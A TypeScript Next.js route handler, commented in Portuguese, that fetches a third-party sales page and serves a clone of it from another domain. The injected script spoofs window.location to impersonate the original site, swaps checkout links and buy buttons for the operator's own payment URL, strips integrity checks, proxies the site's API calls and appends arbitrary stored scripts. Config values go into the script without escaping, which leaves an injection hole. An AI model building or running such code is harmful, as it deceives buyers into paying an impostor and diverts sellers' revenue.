import { NextRequest, NextResponse } from 'next/server';
import { supabaseAdmin } from '@/lib/supabase';
import * as cheerio from 'cheerio';

/**
 * Page Proxy God Mode v4.0 — Minimalist & Ultra-Stable
 * 
 * Estratégia:
 * 1. NÃO altera o HTML original, exceto para injetar o motor SnapFunnel.
 * 2. Usa a tag <base> para que o navegador resolva 100% dos assets (CSS, JS, Imagens)
 *    diretamente do site original. Isso garante layout 1:1.
 * 3. Faz a troca de links de checkout via JavaScript (Interceptação em Tempo Real).
 */

export async function GET(
  req: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  try {
    const { id } = await params;

    // 1. Buscar página
    const { data: page, error } = await supabaseAdmin
      .from('cloned_pages')
      .select('*')
      .eq('id', id)
      .single();

    if (error || !page || !page.original_url) {
      return new NextResponse('<h1>Página não encontrada</h1>', { status: 404 });
    }

    const config = page.config || {};
    const originalUrl = page.original_url;
    const checkoutUrl = config.checkout_url || '';

    // 2. Fetch do HTML Original
    const response = await fetch(originalUrl, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
      },
      next: { revalidate: 0 },
    });

    if (!response.ok) {
      return new NextResponse(`<h1>Erro ao acessar site original (${response.status})</h1>`, { status: 502 });
    }

    const rawHtml = new TextDecoder('utf-8').decode(await response.arrayBuffer());
    const $ = cheerio.load(rawHtml);
    const baseUrlObj = new URL(originalUrl);
    const baseUrl = baseUrlObj.origin;
    const targetHost = baseUrlObj.host;
    const currentOrigin = req.nextUrl.origin;

    // ═══════════════════════════════════════════════
    // 1. BASE TAG (A Chave da Estabilidade Visual)
    // ═══════════════════════════════════════════════
    $('base').remove();
    $('head').prepend(`<base href="${originalUrl}">`);

    // ═══════════════════════════════════════════════
    // 2. ENGINE SNAPFUNNEL (Interceptação e Redirecionamento)
    // ═══════════════════════════════════════════════
    const engineScript = `
      <script id="snapfunnel-engine-v4">
        (function() {
          console.log("SnapFunnel Engine v4.0 - Minimalist Active");
          const CHECKOUT_URL = '${checkoutUrl}';
          const TARGET_HOST = '${targetHost}';
          const TARGET_ORIGIN = '${baseUrl}';
          const PROXY_URL = '${currentOrigin}/api/proxy?url=';

          // SPOOFING
          try {
            Object.defineProperty(window.location, 'hostname', { get: () => TARGET_HOST, configurable: true });
            Object.defineProperty(window.location, 'origin', { get: () => TARGET_ORIGIN, configurable: true });
          } catch(e) {}

          // INTERCEPTOR DE CHECKOUT E ÂNCORAS
          const gateways = ['checkout', 'pay', 'comprar', 'hotmart', 'eduzz', 'monetizze', 'kiwify', 'braip', 'cakto', 'perfectpay', 'ticto', 'yampi', 'cartpanda', 'greenn', 'pepper'];
          
          function patch(el) {
            if (el.tagName === 'A') {
              const hrefAttr = el.getAttribute('href') || '';
              const href = hrefAttr.toLowerCase();

              // TRATAMENTO DE ÂNCORAS (Impedir saída do domínio)
              if (hrefAttr.startsWith('#')) {
                el.addEventListener('click', (e) => {
                  e.preventDefault(); e.stopPropagation();
                  try {
                    const target = document.querySelector(hrefAttr);
                    if (target) target.scrollIntoView({ behavior: 'smooth' });
                    else window.location.hash = hrefAttr;
                  } catch(err) {}
                }, true);
                return;
              }

              // CHECKOUT
              if (CHECKOUT_URL && (gateways.some(g => href.includes(g)) || el.dataset.checkout)) {
                el.href = CHECKOUT_URL;
                el.addEventListener('click', (e) => {
                  e.preventDefault(); e.stopPropagation();
                  const u = new URL(CHECKOUT_URL);
                  const p = new URLSearchParams(window.location.search);
                  ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'].forEach(k => { if (p.get(k)) u.searchParams.set(k, p.get(k)); });
                  window.location.href = u.toString();
                }, true);
              }
            }
            if (el.tagName === 'BUTTON') {
              const text = (el.textContent || '').toLowerCase();
              if (CHECKOUT_URL && ['comprar','adquirir','garantir','quero','assinar','buy'].some(t => text.includes(t))) {
                el.addEventListener('click', (e) => {
                  e.preventDefault(); e.stopPropagation();
                  window.location.href = CHECKOUT_URL;
                }, true);
              }
            }
          }

          // Observar mudanças no DOM para botões dinâmicos
          const obs = new MutationObserver(m => m.forEach(r => r.addedNodes.forEach(n => {
            if (n.nodeType === 1) { patch(n); n.querySelectorAll('a, button').forEach(patch); }
          })));
          obs.observe(document.documentElement, { childList: true, subtree: true });
          
          // Patch inicial e correção de links
          window.addEventListener('load', () => {
             document.querySelectorAll('a, button').forEach(patch);
          });

          // PROXY DE FETCH/XHR (Para que APIs do site original continuem funcionando)
          const _fetch = window.fetch;
          window.fetch = async function(res, cfg) {
            let url = typeof res === 'string' ? res : (res instanceof Request ? res.url : res);
            if (url && (url.startsWith('/') || url.includes(TARGET_HOST)) && !url.includes('/api/proxy')) {
               const fullUrl = url.startsWith('/') ? TARGET_ORIGIN + url : url;
               url = PROXY_URL + encodeURIComponent(fullUrl) + '&overrideHost=' + TARGET_HOST;
               if (res instanceof Request) res = new Request(url, res);
               else res = url;
            }
            return _fetch.call(this, res, cfg);
          };
        })();
      </script>
    `;
    $('head').prepend(engineScript);

    // ═══════════════════════════════════════════════
    // 3. REESCRITA DE ASSETS E CHECKOUT (Híbrido)
    // ═══════════════════════════════════════════════
    const gateways = ['checkout', 'pay', 'comprar', 'hotmart', 'eduzz', 'monetizze', 'kiwify', 'braip', 'cakto', 'perfectpay', 'ticto', 'yampi', 'cartpanda', 'greenn', 'pepper'];
    
    $('[src], [href]').each((_, el) => {
      const tag = $(el).prop('tagName');
      const attr = $(el).attr('src') ? 'src' : 'href';
      let val = $(el).attr(attr) || '';
      
      if (!val || val.startsWith('data:') || val.startsWith('javascript:')) return;

      // 1. Âncoras (Físico)
      if (val.startsWith('#')) {
        $(el).attr(attr, `javascript:document.querySelector('${val}')?.scrollIntoView({behavior:'smooth'})`);
        return;
      }

      // 2. Checkout (Físico)
      if (tag === 'A' && checkoutUrl && gateways.some(g => val.toLowerCase().includes(g))) {
        $(el).attr(attr, checkoutUrl);
        return;
      }

      // 3. Proxy de Scripts/Styles Internos (Resolve o Cabeçalho Branco / CORS)
      const isInternal = val.startsWith('/') || val.includes(targetHost);
      const isScriptOrStyle = tag === 'SCRIPT' || (tag === 'LINK' && $(el).attr('rel') === 'stylesheet');

      if (isScriptOrStyle && isInternal) {
        const absoluteVal = val.startsWith('/') ? baseUrl + val : (val.startsWith('http') ? val : baseUrl + '/' + val);
        const timestamp = Date.now();
        const proxied = `${currentOrigin}/api/proxy?url=${encodeURIComponent(absoluteVal)}&overrideHost=${targetHost}&t=${timestamp}`;
        $(el).attr(attr, proxied);
        $(el).removeAttr('integrity');
        $(el).removeAttr('crossorigin');
      }
    });

    // Injetar Pixels de forma isolada
    if (config.pixel_script) $('body').append(`<div id="sf-pixel" style="display:none !important">${config.pixel_script}</div>`);
    if (config.head_scripts) $('head').append(config.head_scripts);
    if (config.body_scripts) $('body').append(config.body_scripts);

    return new NextResponse($.html(), {
      headers: { 'Content-Type': 'text/html; charset=utf-8' },
    });

  } catch (error: any) {
    return new NextResponse(`Erro: ${error.message}`, { status: 500 });
  }
}
